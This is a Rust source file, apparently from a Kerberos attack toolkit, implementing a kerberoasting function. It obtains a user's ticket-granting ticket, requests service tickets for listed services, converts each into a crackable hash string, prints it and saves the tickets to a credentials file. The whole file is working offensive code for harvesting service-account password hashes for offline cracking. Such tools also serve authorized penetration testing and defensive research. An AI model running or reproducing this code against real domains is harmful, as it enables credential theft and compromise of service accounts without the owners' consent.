use crate::ask::{get_user_tgt, request_tgs};
use crate::crack::{tgs_to_crack_string, CrackFormat};
use crate::cred_format::CredentialFormat;
use crate::file::save_cred_in_file;
use crate::krb_user::KerberosUser;
use crate::transporter::KerberosTransporter;
use crate::error::{Result, Error};
use kerberos_crypto::Key;
use log::{info, warn};

pub fn kerberoast(
    user: KerberosUser,
    services: Vec<String>,
    creds_file: &str,
    user_key: Option<&Key>,
    transporter: &dyn KerberosTransporter,
    cred_format: CredentialFormat,
    crack_format: CrackFormat,
) -> Result<()> {
    let username = user.name.clone();
    let (mut krb_cred_plain, cred_format, ticket, krb_cred_info) =
        get_user_tgt(
            user.clone(),
            creds_file,
            user_key,
            transporter,
            cred_format,
        )?;

    for service in services {
        match request_tgs(
            user.clone(),
            service.clone(),
            &krb_cred_info,
            ticket.clone(),
            transporter,
        ) {
            Err(err) => match &err {
                Error::NetworkError(_, _) => return Err(err),
                _ => warn!("{}", err)
            }
            Ok((tgs, krb_cred_info_tgs)) => {

                let crack_str = tgs_to_crack_string(&username, &service, &tgs, crack_format);
                println!("{}", crack_str);
                krb_cred_plain.cred_part.ticket_info.push(krb_cred_info_tgs);
                krb_cred_plain.tickets.push(tgs);
            }
        }
        
    }

    info!("Save {} TGSs in {}", username, creds_file);
    save_cred_in_file(creds_file, krb_cred_plain.into(), cred_format)?;

    return Ok(());
}
